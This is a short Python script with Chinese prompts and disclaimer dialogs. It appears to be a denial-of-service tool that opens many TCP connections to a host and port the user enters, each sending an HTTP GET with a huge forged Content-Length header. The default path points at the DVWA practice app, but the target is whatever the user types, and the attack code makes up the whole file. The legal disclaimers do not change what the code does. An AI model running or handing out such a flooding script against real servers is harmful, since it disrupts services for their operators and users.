import socket
from tkinter import messagebox
import time
print("请不要使用本工具进行违法操作")
messagebox.askquestion('用户协议', '本软件遵守《中华人民共和国计刑法》第二百八十六条，且本软件非故意制作、违反国家规定')
messagebox.askquestion('提示','本软件作者均不承担任何法律责任')
print('启动中')
CONN = int(input("连接数量      :"))
HOST = input("IP或域名             :")
PORT = int(input("端口号           :"))
PAGE = "/DVWA"
buf = ("GET %s HTTP/1.1\r\n"
          "Host: %s\r\n"
          "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:52.0 Gecko/20100101 Firefox/52.0\r\n"
          "Content-Length: 10000000000\r\n"
          "\r\n" % (PAGE, HOST))
socks = []
for i in range(CONN):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.connect((HOST, PORT))
         s.send(bytes(buf, encoding='utf-8'))
         print("[+] HTTP:Send Success!,conn=%d" % i)
         socks.append(s)
         s.close()
     except Exception as ex:
         print("[-] HTTP:Send Failure!,ERROR:%s" % ex)
         time.sleep(2)
                    